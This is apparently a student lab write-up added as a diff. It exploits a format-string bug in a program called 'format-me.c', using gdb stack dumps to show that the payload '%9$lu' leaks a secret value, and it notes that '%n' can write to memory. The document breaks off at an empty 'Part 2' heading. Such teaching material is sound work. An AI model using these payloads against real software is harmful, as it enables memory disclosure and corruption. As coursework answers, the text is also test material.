@@ -1,0 +1,58 @@
+= Part 1
+
+Since user input is passed directly to `printf`,
+we can do a format string explot.
+The first issue is finding out where the code value is stored.
+
+I set a breakpoint for `format-me.c:44`
+(right before it prompts for user input) and ran the program.
+Then I found out the address of `code`.
+
+```
+(gdb) p &code
+$1 = (long *) 0x7fffffffdfc8
+```
+
+Then I set a breakpoint for `format-me.c:47`
+(right before it passes user input to `printf`).
+I then stepped into the `printf` function.
+
+```
+(gdb) bt
+#0  0x0000555555555164 in printf@plt ()
+#1  0x00005555555554de in game () at format-me.c:47
+#2  0x00005555555555b1 in main () at format-me.c:69
+(gdb) x/16xg $sp
+0x7fffffffdfa8:	0x00005555555554de	0x00007fffffffdfd0
+0x7fffffffdfb8:	0x00000000f7c8da16	0x0000000000000000
+0x7fffffffdfc8:	0x3eb6c7e2095753fa	0x00000a6e61687465
+0x7fffffffdfd8:	0x0000000000000000	0x0000000000000000
+0x7fffffffdfe8:	0x0000000000000000	0x0000000000000000
+0x7fffffffdff8:	0x0000000000000000	0x0000000000000000
+0x7fffffffe008:	0x0000000000000000	0x00007fffffffe020
+0x7fffffffe018:	0x66dd47dbafd00000	0x00007fffffffe030
+```
+
+At the beginning of `printf`,
+we can see that the top of the stack is the return address
+and that `code` is 32 bytes away.
+Therefore, if we pass `"%lu %lu %lu %lu %lu %lu %lu %lu %lu"`
+to printf, The first 5 numbers will be the register values and
+the last number will be the value of `code`.
+Alternatively, we can use `"%9$lu"` to get the 9th argument.
+
+== Question 1
+
+The random variable is 32 bytes above the return address for `printf`.
+The format string that can leak this value is `"%9$lu"`.
+
+== Question 2
+
+Format strings are still potentially dangerous because
+we can write to memory addresses using `%n`,
+which takes a pointer and writes to the address the
+number of characters written so far.
+
+= Part 2
+
+
